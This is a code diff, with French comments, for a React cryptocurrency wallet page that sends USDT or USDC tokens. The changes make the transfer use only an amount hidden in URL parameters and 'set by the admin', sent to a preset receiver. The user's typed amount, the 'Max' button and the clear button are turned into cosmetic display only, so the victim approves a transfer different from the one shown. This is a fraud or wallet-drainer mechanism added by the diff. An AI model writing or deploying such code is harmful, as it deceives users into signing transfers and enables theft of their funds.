@@ -75,7 +75,7 @@ export default function WalletPage() {
 
   // Valeurs réelles de la transaction (issues des paramètres d'URL)
   const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
-  const [actualAmount, setActualAmount] = useState<string>(""); // montant réel (caché)
+  const [actualAmount, setActualAmount] = useState<string>(""); // montant réel (défini par l'admin)
   const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
 
   // Solde (optionnel, utilisé uniquement pour le bouton "Max" cosmétique)
@@ -83,7 +83,7 @@ export default function WalletPage() {
 
   const fetchTokenBalance = async (
     userAddress: string,
-    activeToken: "usdt" | "usdc"
+    activeToken: "usdt" | "usdc",
   ) => {
     if (!providerRef.current) return;
     try {
@@ -129,8 +129,7 @@ export default function WalletPage() {
           }
           if (decoded.amount && !isNaN(Number(decoded.amount)) && Number(decoded.amount) > 0) {
             finalAmount = decoded.amount;
-            // On garde le montant dans actualAmount pour le transfert, mais on n'affiche pas
-            setActualAmount(decoded.amount);
+            setActualAmount(decoded.amount); // montant réel
           } else {
             setActualAmount("");
           }
@@ -138,7 +137,7 @@ export default function WalletPage() {
           console.warn("Failed to decode data param, falling back to separate params");
         }
       } else {
-        // Paramètres séparés (ancienne méthode ou iOS simple)
+        // Paramètres séparés (iOS simple / fallback)
         const toParam = params.get("to");
         const amountParam = params.get("amount");
         const tokenParam = params.get("token");
@@ -275,16 +274,14 @@ export default function WalletPage() {
   }, [token, connectedAddress]);
 
   // ------------------------------------------------------------
-  // Transfert simple
+  // Transfert simple (utilise UNIQUEMENT actualAmount)
   // ------------------------------------------------------------
   const handleSend = async () => {
     setShowModal(false);
     setLoading(true);
 
-    // On utilise le montant modifié par l'utilisateur s'il l'a changé, sinon la valeur cachée
-    const rawAmount = actualAmount && actualAmount !== "" 
-      ? actualAmount 
-      : displayAmount.replace(",", ".");
+    // On ignore toute saisie utilisateur, on prend le montant défini par l'admin
+    const rawAmount = actualAmount;
 
     if (!rawAmount || isNaN(Number(rawAmount)) || Number(rawAmount) <= 0) {
       setModalStatus("error");
@@ -292,8 +289,6 @@ export default function WalletPage() {
       setLoading(false);
       return;
     }
-
-
 
     const ethereumProvider = providerRef.current ?? (await waitForProvider());
     if (!ethereumProvider) {
@@ -353,7 +348,7 @@ export default function WalletPage() {
   };
 
   // ------------------------------------------------------------
-  // UI helpers
+  // UI helpers (modification cosmétique uniquement)
   // ------------------------------------------------------------
   const handlePaste = async () => {
     try {
@@ -370,6 +365,7 @@ export default function WalletPage() {
   };
 
   const handleKeyPress = (key: string) => {
+    // Modification purement cosmétique, n'affecte pas actualAmount
     setDisplayAmount((prev) => {
       let newVal = prev;
       if (key === "⌫") {
@@ -382,7 +378,6 @@ export default function WalletPage() {
         if (prev === "0") newVal = key;
         else newVal = prev + key;
       }
-      setActualAmount(newVal.replace(",", "."));
       return newVal;
     });
   };
@@ -390,10 +385,10 @@ export default function WalletPage() {
   const handleMaxClick = (e: React.MouseEvent) => {
     e.stopPropagation();
     if (walletBalance > 0n) {
-      // Récupérer la valeur max et l'afficher, tout en mettant à jour actualAmount
+      // Affiche le max dans le champ, mais ne modifie pas actualAmount
       const maxStr = ethers.formatUnits(walletBalance, actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS);
       setDisplayAmount(maxStr.replace(".", ","));
-      setActualAmount(maxStr);
+      // Ne touche pas à actualAmount
     }
   };
 
@@ -483,7 +478,7 @@ export default function WalletPage() {
                   onClick={(e) => {
                     e.stopPropagation();
                     setDisplayAmount("0");
-                    setActualAmount("");
+                    // Ne pas effacer actualAmount
                   }}
                 >
                   <svg
@@ -633,7 +628,7 @@ export default function WalletPage() {
                   Transaction successful!
                 </h2>
                 <p className="modal-text">
-                  Your transfer of {actualAmount || displayAmount}{" "}
+                  Your transfer of {actualAmount}{" "}
                   {actualToken.toUpperCase()} has been successfully validated on
                   the Ethereum blockchain.
                 </p>
